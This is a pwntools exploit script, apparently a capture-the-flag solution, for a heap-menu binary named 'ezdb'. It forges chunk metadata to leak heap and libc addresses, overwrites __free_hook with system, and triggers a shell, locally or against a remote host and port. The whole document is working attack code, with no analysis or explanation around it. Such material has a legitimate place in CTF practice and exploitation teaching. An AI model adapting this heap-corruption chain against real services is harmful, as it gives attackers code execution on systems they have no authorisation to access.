#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("ezdb_patched")
libc = e.libc

gs = """
ida_connect
# b add
# b del
# b reEdit
b *0x040171A
b system
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def add(bufList: list):
    ret = []
    p.sendafter(b">", b'\x01')
    p.send(p32(len(bufList)))
    for s_ in bufList:
        p.send(p32(s_[0])+p32(s_[1])+s_[2])
        ret.append(u32(p.recv(4)))

    p.send(b'\n')
    return ret[0]


def edit(idx, newid, size, buf):
    p.sendafter(b">", b'\x02')
    p.send(
        p32(idx) +
        p32(newid) +
        p32(size) +
        buf
    )
    _ = p.recv(4)
    p.send(b'\n')
    return u32(_)


def show(idx):
    p.sendafter(b">", b'\x04')
    p.send(
        p32(idx)
    )
    p.send(b'\n')


def delete(idx):
    p.sendafter(b">", b'\x05')
    p.send(
        p32(idx)
    )
    p.send(b'\n')


add([(0,  0x20, b'0'*0x20)])
add([(1,  0x20, b'1'*0x20)])
add([(2,  0x600, b'2'*0x600)])


delete(2)
delete(0)

buf = b'0'*(0x100-0x10)+p64(0)+p64(0x31)
add([(0,  0x500, buf.ljust(0x500, b'\0'))])


edit(2, 2, 0x68, b'_'*0x68)


buf = b'0'*(0x70)+p64(0)+p64(0x31)
delete(0)
add([(0,  0x500, buf.ljust(0x500, b'\0'))])
l = add([(1,  0x20, b'T'*0x20)])


delete(l)
buf = b'0'*(0x70)+p64(0)+p64(0x31)+p64(0)+p64(0)
delete(0)
add([(0,  0x500, buf.ljust(0x500, b'\0'))])


edit(l, l, 0x38, b'_'*0x38)

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()


lmao = add([(1,  0x20, b'T'*0x20)])
hehe = add([(1,  0x20, b'T'*0x20)])
delete(lmao)
delete(1)
show(hehe)
p.recvuntil(b'T'*8)
heap = u32(p.recv(4))-0x10

log.success(hex(heap))

add([(1,  0x20, b'1'*0x20)])

buf = b'0'*(0x20)+p64(0)+p64(0x31) + p64(heap+0x320)
delete(0)
add([(0,  0x500, buf.ljust(0x500, b'\0'))])


edit(2, 2, 0x20, b'_'*0x20)
edit(3, 3, 0x20, p64(6)+p64(e.got.free)+p64(0)*2)


show(6)
p.recv(8)
libc.address = u64(p.recv(6)+b'\0\0') - libc.sym.free
log.success(hex(libc.address))


delete(1)
delete(hehe)


buf = b'0'*(0x20)+p64(0)+p64(0x31) + p64(libc.sym.__free_hook)
delete(0)
add([(0,  0x500, buf.ljust(0x500, b'\0'))])


add([(1,  0x20, b'sh\0'.ljust(0x20))])
add([(1,  0x20, p64(libc.sym.system)+p64(0)*3)])


delete(1)

p.interactive()
